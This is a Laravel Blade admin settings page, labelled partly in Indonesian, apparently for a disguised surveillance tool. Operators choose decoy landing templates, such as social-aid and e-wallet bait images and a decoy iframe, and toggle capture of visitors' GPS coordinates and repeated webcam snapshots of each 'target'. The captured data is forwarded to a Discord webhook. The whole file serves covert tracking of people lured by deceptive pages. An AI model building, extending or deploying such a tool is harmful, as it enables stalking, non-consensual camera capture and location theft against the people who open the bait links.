@extends('layouts.admin')

@section('title', 'Discord & Settings')

@section('content')
<div class="space-y-6 max-w-5xl mx-auto">

    <!-- Header -->
    <div>
        <h1 class="text-xl sm:text-2xl font-bold text-white tracking-tight">Configuration & Templates</h1>
        <p class="text-zinc-400 text-xs sm:text-sm mt-0.5">Manage landing templates, Discord Webhook integrations, disguise parameters, and telemetry triggers.</p>
    </div>

    <!-- Discord Integration Card -->
    <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-zinc-800 pb-4">
            <div class="flex items-center space-x-3">
                <div class="w-10 h-10 rounded-xl bg-[#5865F2]/20 border border-[#5865F2]/40 flex items-center justify-center text-[#5865F2] text-xl shrink-0">
                    <i class="fa-brands fa-discord"></i>
                </div>
                <div>
                    <h3 class="font-bold text-white text-sm sm:text-base">Discord Webhook Integration</h3>
                    <p class="text-[11px] sm:text-xs text-zinc-400">Telemetry logs & target photos will be forwarded directly to your Discord channel.</p>
                </div>
            </div>

            <button type="button" onclick="testWebhook()" id="testWebhookBtn"
                    class="w-full sm:w-auto px-4 py-2.5 bg-[#5865F2] hover:bg-[#4752C4] text-white text-xs font-semibold rounded-xl shadow-lg shadow-[#5865F2]/20 transition flex items-center justify-center gap-1.5 active:scale-95 shrink-0">
                <i class="fa-solid fa-paper-plane"></i>
                <span>Test Webhook</span>
            </button>
        </div>

        <div id="webhookTestResult" class="hidden p-3 rounded-xl text-xs flex items-center gap-2"></div>
    </div>

    <!-- Master Settings Form -->
    <form action="{{ route('admin.settings.update') }}" method="POST" class="space-y-6">
        @csrf

        <!-- Template Selector Section -->
        <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-1 border-b border-zinc-800 pb-3">
                <div>
                    <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold">Active Landing Page Template</h4>
                    <p class="text-[11px] sm:text-xs text-zinc-400 mt-0.5">Select disguise template served by default at root URL (<code>/</code>).</p>
                </div>
                <span class="text-[10px] sm:text-[11px] text-zinc-500 font-mono">Also available via <code>/p/{slug}</code></span>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 pt-1">
                @foreach($templates as $id => $tpl)
                    <label class="relative block cursor-pointer group">
                        <input type="radio" name="active_template" value="{{ $id }}" {{ $settings['active_template'] === $id ? 'checked' : '' }} class="sr-only peer">
                        <div class="p-4 rounded-xl border bg-zinc-950/80 transition duration-200 peer-checked:border-pink-500 peer-checked:bg-pink-950/20 peer-checked:shadow-lg peer-checked:shadow-pink-500/10 border-zinc-800 hover:border-zinc-700 h-full flex flex-col justify-between">
                            <div>
                                <div class="flex items-center justify-between mb-2.5">
                                    <div class="w-8 h-8 rounded-lg bg-gradient-to-tr {{ $tpl['color'] }} flex items-center justify-center text-white text-xs shadow">
                                        <i class="fa-solid {{ $tpl['icon'] }}"></i>
                                    </div>
                                    <span class="px-2 py-0.5 text-[9px] sm:text-[10px] font-semibold rounded-full bg-zinc-800 text-zinc-300">
                                        {{ $tpl['badge'] }}
                                    </span>
                                </div>
                                <h5 class="font-bold text-white text-sm group-hover:text-pink-400 transition">{{ $tpl['name'] }}</h5>
                                <p class="text-[11px] text-zinc-400 mt-1 leading-relaxed">{{ $tpl['description'] }}</p>
                            </div>

                            <div class="pt-3 border-t border-zinc-800/80 mt-3 flex items-center justify-between text-[11px]">
                                <span class="text-zinc-500 font-mono text-[10px]">/p/{{ $id }}</span>
                                <a href="{{ route('landing.custom', $id) }}" target="_blank" onclick="event.stopPropagation();" class="text-pink-400 hover:text-pink-300 font-medium text-[11px]">
                                    Preview <i class="fa-solid fa-arrow-up-right-from-square text-[9px]"></i>
                                </a>
                            </div>
                        </div>
                    </label>
                @endforeach
            </div>
        </div>

        <!-- Discord Settings Section -->
        <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-1">Webhook Credentials</h4>

            <div>
                <label for="discord_webhook_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Discord Webhook URL</label>
                <input type="url" id="discord_webhook_url" name="discord_webhook_url" 
                       value="{{ old('discord_webhook_url', $settings['discord_webhook_url']) }}"
                       placeholder="https://discord.com/api/webhooks/1234567890/abcdefg..."
                       class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white font-mono placeholder-zinc-600 focus:outline-none focus:border-pink-500">
                <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-1">Stored securely on the backend. Never exposed to visitor browsers.</p>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5 pt-1">
                <div>
                    <label for="bot_name" class="block text-xs font-medium text-zinc-300 mb-1.5">Bot Display Name</label>
                    <input type="text" id="bot_name" name="bot_name" 
                           value="{{ old('bot_name', $settings['bot_name']) }}"
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>
                <div>
                    <label for="bot_avatar_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Bot Avatar URL</label>
                    <input type="url" id="bot_avatar_url" name="bot_avatar_url" 
                           value="{{ old('bot_avatar_url', $settings['bot_avatar_url']) }}"
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>
            </div>
        </div>

        <!-- Disguise & Decoy Parameters -->
        <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-1">Pengaturan Konten & Preview (Custom Template / Default)</h4>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                <div>
                    <label for="site_title" class="block text-xs font-medium text-zinc-300 mb-1.5">Page Title / Social OpenGraph Title</label>
                    <input type="text" id="site_title" name="site_title" 
                           value="{{ old('site_title', $settings['site_title']) }}" required
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>

                <div>
                    <label for="landing_heading" class="block text-xs font-medium text-zinc-300 mb-1.5">Hero Headline / Judul Utama</label>
                    <input type="text" id="landing_heading" name="landing_heading" 
                           value="{{ old('landing_heading', $settings['landing_heading']) }}"
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>
            </div>

            <div>
                <label for="site_description" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Description / Ringkasan Artikel</label>
                <input type="text" id="site_description" name="site_description" 
                       value="{{ old('site_description', $settings['site_description']) }}"
                       class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
            </div>

            <div>
                <label for="og_image_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Image & Banner (URL atau Path Lokal)</label>
                <input type="text" id="og_image_url" name="og_image_url" 
                       value="{{ old('og_image_url', $settings['og_image_url']) }}"
                       placeholder="images/landing/bansos-banner.jpg atau https://..."
                       class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-1">Aset lokal tersedia: <code>images/landing/bansos-banner.jpg</code>, <code>images/landing/bg.jpg</code>, <code>images/landing/dana-logo.png</code>, <code>images/landing/kapan-pulang.jfif</code></p>
            </div>

            <div>
                <label for="decoy_iframe_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Decoy Iframe Website URL <span class="text-zinc-500 font-normal">(Opsional - Bisa Dikosongkan)</span></label>
                <input type="url" id="decoy_iframe_url" name="decoy_iframe_url" 
                       value="{{ old('decoy_iframe_url', $settings['decoy_iframe_url']) }}"
                       placeholder="https://... (Biarkan kosong jika tidak ingin menampilkan iframe)"
                       class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-1">Jika dikosongkan, halaman akan tampil bersih sebagai portal berita/artikel mandiri tanpa frame website.</p>
            </div>
        </div>

        <!-- Telemetry & Capture Engine -->
        <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-1">Telemetry Rules & Triggers</h4>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div class="p-3.5 bg-zinc-950 rounded-xl border border-zinc-800 flex items-center justify-between gap-2">
                    <div>
                        <div class="text-xs font-medium text-white">Capture GPS Location</div>
                        <div class="text-[10px] text-zinc-500">Browser satellite coordinates</div>
                    </div>
                    <select name="capture_gps_enabled" class="px-2.5 py-1.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white">
                        <option value="1" {{ $settings['capture_gps_enabled'] == '1' ? 'selected' : '' }}>Enabled</option>
                        <option value="0" {{ $settings['capture_gps_enabled'] == '0' ? 'selected' : '' }}>Disabled</option>
                    </select>
                </div>

                <div class="p-3.5 bg-zinc-950 rounded-xl border border-zinc-800 flex items-center justify-between gap-2">
                    <div>
                        <div class="text-xs font-medium text-white">Capture Webcam Stream</div>
                        <div class="text-[10px] text-zinc-500">Camera snapshots capture</div>
                    </div>
                    <select name="capture_cam_enabled" class="px-2.5 py-1.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white">
                        <option value="1" {{ $settings['capture_cam_enabled'] == '1' ? 'selected' : '' }}>Enabled</option>
                        <option value="0" {{ $settings['capture_cam_enabled'] == '0' ? 'selected' : '' }}>Disabled</option>
                    </select>
                </div>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5 pt-1">
                <div>
                    <label for="cam_interval_ms" class="block text-xs font-medium text-zinc-300 mb-1.5">Camera Interval (Milliseconds)</label>
                    <input type="number" id="cam_interval_ms" name="cam_interval_ms" min="1000" max="60000" step="500"
                           value="{{ old('cam_interval_ms', $settings['cam_interval_ms']) }}"
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>

                <div>
                    <label for="max_snapshots_per_session" class="block text-xs font-medium text-zinc-300 mb-1.5">Max Snapshots Per Target</label>
                    <input type="number" id="max_snapshots_per_session" name="max_snapshots_per_session" min="1" max="50"
                           value="{{ old('max_snapshots_per_session', $settings['max_snapshots_per_session']) }}"
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>
            </div>
        </div>

        <div class="flex justify-end">
            <button type="submit" class="w-full sm:w-auto px-6 py-3 bg-pink-600 hover:bg-pink-500 text-white font-medium text-xs sm:text-sm rounded-xl shadow-lg shadow-pink-600/30 transition flex items-center justify-center gap-2 active:scale-95">
                <i class="fa-solid fa-floppy-disk"></i>
                <span>Save All Settings & Template</span>
            </button>
        </div>

    </form>

    <!-- Security & Password Change Card -->
    <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
        <div class="border-b border-zinc-800 pb-3">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold">Admin Account Security</h4>
            <p class="text-[11px] sm:text-xs text-zinc-400 mt-0.5">Change your operator dashboard password at any time.</p>
        </div>

        <form action="{{ route('admin.settings.password') }}" method="POST" class="space-y-4">
            @csrf
            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3.5">
                <div>
                    <label for="current_password" class="block text-xs font-medium text-zinc-300 mb-1.5">Current Password</label>
                    <input type="password" id="current_password" name="current_password" required
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>

                <div>
                    <label for="new_password" class="block text-xs font-medium text-zinc-300 mb-1.5">New Password</label>
                    <input type="password" id="new_password" name="new_password" minlength="8" required
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>

                <div>
                    <label for="new_password_confirmation" class="block text-xs font-medium text-zinc-300 mb-1.5">Confirm New Password</label>
                    <input type="password" id="new_password_confirmation" name="new_password_confirmation" minlength="8" required
                           class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
                </div>
            </div>

            <div class="flex justify-end pt-1">
                <button type="submit" class="w-full sm:w-auto px-5 py-2.5 bg-zinc-800 hover:bg-zinc-700 text-white font-medium text-xs rounded-xl transition flex items-center justify-center gap-1.5 active:scale-95">
                    <i class="fa-solid fa-key"></i>
                    <span>Update Password</span>
                </button>
            </div>
        </form>
    </div>

</div>

<script>
function testWebhook() {
    const btn = document.getElementById('testWebhookBtn');
    const resultDiv = document.getElementById('webhookTestResult');
    const url = document.getElementById('discord_webhook_url').value;

    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1"></i> Testing...';
    resultDiv.classList.add('hidden');

    fetch("{{ route('admin.settings.test_webhook') }}", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-CSRF-TOKEN': '{{ csrf_token() }}'
        },
        body: JSON.stringify({ url: url })
    })
    .then(async response => {
        const data = await response.json();
        resultDiv.classList.remove('hidden');
        if (response.ok && data.success) {
            resultDiv.className = 'p-3 rounded-xl text-xs flex items-center gap-2 bg-emerald-950/80 border border-emerald-800 text-emerald-300';
            resultDiv.innerHTML = '<i class="fa-solid fa-circle-check text-base"></i><span>' + data.message + '</span>';
        } else {
            resultDiv.className = 'p-3 rounded-xl text-xs flex items-center gap-2 bg-red-950/80 border border-red-800 text-red-300';
            resultDiv.innerHTML = '<i class="fa-solid fa-circle-xmark text-base"></i><span>' + (data.message || 'Webhook verification failed.') + '</span>';
        }
    })
    .catch(err => {
        resultDiv.classList.remove('hidden');
        resultDiv.className = 'p-3 rounded-xl text-xs flex items-center gap-2 bg-red-950/80 border border-red-800 text-red-300';
        resultDiv.innerHTML = '<i class="fa-solid fa-circle-xmark text-base"></i><span>Network or server error during webhook test.</span>';
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-paper-plane mr-1"></i> Test Webhook';
    });
}
</script>
@endsection
